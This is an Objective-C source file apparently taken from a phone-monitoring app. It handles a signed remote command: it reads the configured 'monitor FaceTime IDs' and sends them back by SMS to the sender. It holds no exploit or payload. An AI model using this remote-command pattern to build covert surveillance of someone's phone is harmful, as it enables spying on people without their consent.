//
//  QueryMonitorFacetimeIDsProcessor.m
//  RCM
//
//  Created by Benjawan Tanarattanakorn on 7/10/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "QueryMonitorFacetimeIDsProcessor.h"
#import "PrefMonitorFacetimeID.h"
#import "Preference.h"

@interface QueryMonitorFacetimeIDsProcessor (PrivateAPI)
- (void) sendReplySMSWithResult: (NSString *) aResult; 
- (void) processQueryMonitorFacetimeIDs;
@end


@implementation QueryMonitorFacetimeIDsProcessor


/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the QueryMonitorFacetimeIDsProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: self (QueryMonitorFacetimeIDsProcessor)
 */

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData  {
    DLog (@"QueryMonitorFacetimeIDsProcessor--->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}

#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the QueryMonitorFacetimeIDsProcessor
 - Argument list and description:No Argument 
 - Return description: No return type
 */

- (void) doProcessingCommand {
	DLog (@"QueryMonitorFacetimeIDsProcessor--->doProcessingCommand")
	if (![RemoteCmdSignatureUtils verifyRemoteCmdDataSignature:mRemoteCmdData
										 numberOfCompulsoryTag:2]) {
		[RemoteCmdSignatureUtils throwInvalidCmdWithName:@"QueryMonitorFacetimeIDsProcessor"
												  reason:@"Failed signature check"];
	}
	
    [self processQueryMonitorFacetimeIDs];
}

#pragma mark QueryMonitorFacetimeIDsProcessor PrivateAPI

/**
 - Method name: processQueryMonitorFacetimeIDs
 - Purpose:This method is used to process query monitors
 - Argument list and description: No Argument
 - Return description: No Return Type
 */

- (void) processQueryMonitorFacetimeIDs {
	DLog (@"QueryMonitorFacetimeIDsProcessor--->processQueryMonitorFacetimeIDs")

	id <PreferenceManager> prefManager	= [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefMonitorFacetimeID *prefMonitorFacetimeID		= (PrefMonitorFacetimeID *) [prefManager preference:kFacetimeID];
	NSArray *monitors					= [prefMonitorFacetimeID mMonitorFacetimeIDs];
	NSString *result					= NSLocalizedString(@"kQueryFacetimeIDs", @"");
	for (NSString *monitorNumber in monitors) {
		DLog(@"facetime id number: %@", monitorNumber)
		result							= [result stringByAppendingString:@"\n"];
		result							= [result stringByAppendingString:monitorNumber];
	}
	[self sendReplySMSWithResult:result];
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: aResult (NSString)
 - Return description: No return type
 */

- (void) sendReplySMSWithResult:(NSString *) aResult {
	
	DLog (@"QueryMonitorFacetimeIDsProcessor--->sendReplySMSWithResult")
	
	NSString *messageFormat					= [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																											andErrorCode:_SUCCESS_];
	NSString *queryMonitorFacetimeIDMessage	= [NSString stringWithFormat:@"%@%@", messageFormat,aResult];
	
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:queryMonitorFacetimeIDMessage];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
														       andMessage:queryMonitorFacetimeIDMessage];
	}
}

/**
 - Method name: dealloc
 - Purpose:This method is used to Handle Memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
 */

-(void) dealloc {
	[super dealloc];
}



@end
